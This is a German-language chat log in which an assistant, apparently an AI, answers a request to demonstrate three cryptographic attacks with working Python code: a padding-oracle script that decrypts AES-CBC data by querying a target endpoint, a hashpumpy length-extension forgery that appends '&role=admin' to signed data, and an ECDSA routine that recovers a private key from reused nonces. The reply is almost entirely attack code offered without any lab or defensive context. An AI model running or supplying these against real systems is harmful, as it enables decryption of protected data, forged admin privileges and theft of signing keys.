MESSAGE user """Zeige Padding Oracle, Hash Length Extension und ECDSA-Nonce-Reuse Angriffe."""
MESSAGE assistant """Kryptographie-Angriffe

Padding Oracle (CBC-Entschluesselung ohne Key):
```python
#!/usr/bin/env python3
# Entschluesselt AES-CBC durch Padding-Oracle
# Benoetigte Info: Fehlerunterschied bei falschem Padding vs. Entschluesselungsfehler
import requests, base64

BLOCK = 16

def oracle(ct_bytes):
    # Gibt True wenn Padding korrekt ist (HTTP 200 statt 500)
    r = requests.get("http://target/decrypt",
                     params={"data": base64.b64encode(ct_bytes).decode()}, timeout=5)
    return r.status_code == 200

def decrypt_block(iv_block, ct_block):
    # iv_block: vorheriger Block (oder IV), ct_block: zu entschluesselnder Block
    intermediate = bytearray(BLOCK)
    for i in range(BLOCK - 1, -1, -1):
        pad = BLOCK - i
        crafted = bytearray(BLOCK)
        for k in range(i + 1, BLOCK):
            crafted[k] = intermediate[k] ^ pad
        for g in range(256):
            crafted[i] = g
            if oracle(bytes(crafted) + ct_block):
                intermediate[i] = g ^ pad
                break
    return bytes(b ^ a for b, a in zip(intermediate, iv_block))

# Anwendung: blocks = [iv] + [ct[i:i+16] for i in range(0,len(ct),16)]
# plain = b''.join(decrypt_block(blocks[i], blocks[i+1]) for i in range(len(blocks)-1))
```

Hash Length Extension (MD5/SHA1/SHA256 ohne HMAC):
```python
# Tool: hashpumpy
# pip install hashpumpy
import hashpumpy

original_data = b"user=admin&role=user"
original_sig  = "d41d8cd98f00b204e9800998ecf8427e"  # MD5(secret + data)
append_data   = b"&role=admin"

for secret_len in range(1, 50):
    new_sig, new_data = hashpumpy.hashpump(original_sig, original_data, append_data, secret_len)
    # Teste new_data + new_sig gegen den Server
    print(f"SecretLen {secret_len}: sig={new_sig}")
```

ECDSA Nonce-Reuse (r-Wert identisch in 2 Signaturen):
```python
# Wenn zwei Signaturen denselben r-Wert haben -> Private Key berechenbar
from sympy import mod_inverse

# sig1 = (r, s1) fuer msg1, sig2 = (r, s2) fuer msg2, gleicher Nonce k
# k = (hash1 - hash2) * mod_inverse(s1 - s2, n) mod n
# d = (s1*k - hash1) * mod_inverse(r, n) mod n

def recover_key(r, s1, s2, h1, h2, n):
    # n = Kurvenordnung (bei P-256: 0xFFFF...4361)
    k = ((h1 - h2) * mod_inverse((s1 - s2) % n, n)) % n
    d = ((s1 * k - h1) * mod_inverse(r, n)) % n
    return k, d

# h1, h2 = int(hashlib.sha256(msg1).hexdigest(), 16) etc.
```"""

